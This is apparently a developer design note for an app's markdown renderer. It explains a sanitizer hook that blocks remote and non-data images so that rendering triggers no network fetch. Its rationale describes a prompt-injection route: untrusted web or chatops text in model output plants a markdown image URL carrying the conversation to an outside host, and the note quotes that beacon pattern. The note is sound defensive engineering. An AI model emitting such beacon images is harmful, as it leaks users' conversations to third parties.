# Rendered markdown never auto-loads images

`renderer/shared/Markdown.tsx` registers a DOMPurify `afterSanitizeAttributes` hook: an
`<img>` survives only if its `src` is an inline `data:image/(png|jpeg|webp)` URL. Anything
else (remote http(s), local path, SVG/other data: MIME) is replaced by its alt text — plus a
plain link for http(s) — so displaying it fetches nothing (#183). The same hook strips `src`
from every non-`img` element (video/audio/source/input), and the sanitize config closes the
other fetch channels: html-only profile (no SVG `<image>`), no `<style>`, no `style`/`srcset`/
`sizes`/`poster`/`background` attributes.

**Why:** Bean windows have no CSP, so a remote `img` is fetched just by rendering. Model
output carries untrusted text from `fetch_url`, web search, and ambient chatops; a planted
`![](https://host/?q=<conversation>)` is a tracking/exfiltration beacon.

**How to apply:** a feature that needs to show an image in markdown (e.g. notes images) must
resolve it to a data: URL before rendering — don't widen the hook's allowlist to `https:` or
`file:`. Test: `packages/app/__test__/markdown-images.test.ts` (jsdom env).
